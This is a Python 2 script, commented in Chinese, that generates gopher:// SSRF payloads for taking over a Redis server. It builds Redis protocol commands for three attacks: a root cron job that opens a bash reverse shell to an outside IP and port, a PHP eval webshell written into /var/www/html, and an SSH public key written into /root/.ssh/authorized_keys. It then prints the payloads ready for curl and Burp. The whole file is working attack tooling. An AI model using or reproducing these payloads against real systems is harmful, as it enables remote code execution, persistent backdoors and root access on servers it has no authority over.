# -*- coding: utf-8 -*-

import urllib
#基础必要信息
protocol="gopher://"
ip="172.17.0.6"
port="6379"
passwd="P@ssw0rd"

#定时任务反弹shell所需配置信息
reverse_ip="12.34.56.78"
reverse_port="2333"
cron="\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n\n\n"%(reverse_ip,reverse_port)
cr_filename="root"
cr_path="/var/spool/cron"

#网站绝对路径写shell所需配置信息
shell="\n\n<?php eval($_GET[1]);?>\n\n"
web_filename="tik.php"   # shell的名字
web_path="/var/www/html"      # 写入的路径

#redis写入ssh公钥 所需配置信息
sshpublic_key = "\n\nid_rsa.pub 里的内容\n\n"
ssh_filename="authorized_keys"
ssh_path="/root/.ssh/"

#定时任务命令模板
cr_cmd=["flushall",
     "set 1 {}".format(cron.replace(" ","${IFS}")),
     "config set dir {}".format(cr_path),
     "config set dbfilename {}".format(cr_filename),
     "save"
     ]

#网站绝对路径写webshell命令模板
web_cmd=["flushall",
     "config set dir {}".format(web_path),
     "config set dbfilename {}".format(web_filename),
     "set x {}".format(shell.replace(" ","${IFS}")),
     "save"
     ]

#redis写入ssh公钥命令模板
ssh_cmd=["flushall",
     "set 1 {}".format(sshpublic_key.replace(" ","${IFS}")),
     "config set dir {}".format(ssh_path),
     "config set dbfilename {}".format(ssh_filename),
     "save"
     ]

if passwd:
    web_cmd.insert(0,"AUTH {}".format(passwd))
    cr_cmd.insert(0,"AUTH {}".format(passwd))
    ssh_cmd.insert(0, "AUTH {}".format(passwd))


payload=protocol+ip+":"+port+"/_"

def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":

    cmd = raw_input(unicode("redis常见的SSRF利用方式>>>\n1.定时任务反弹shell请输入cron\n2.网站绝对路径写webshell请输入web\n3.redis写入ssh公钥请输入ssh\n请输入你想获取的payload:",'utf-8').encode('gbk'))

    if cmd=='cron':
        for x in cr_cmd:
            payload += urllib.quote(redis_format(x))
        print "\ncron_curl_payload:\n"+payload+"\n"
        print "\ncron_burp_payload:\n"+urllib.quote(payload)

    elif cmd=='web':
        for x in web_cmd:
            payload += urllib.quote(redis_format(x))
        print "\nweb_curl_payload:\n"+payload+"\n"
        print "\nweb_burp_payload:\n"+urllib.quote(payload)
    elif cmd=='ssh':
        for x in ssh_cmd:
            payload += urllib.quote(redis_format(x))
        print "\nssh_curl_payload:\n"+payload+"\n"
        print "\nssh_burp_payload:\n"+urllib.quote(payload)
        
    else:
    
        print "\nParameter error!!!"    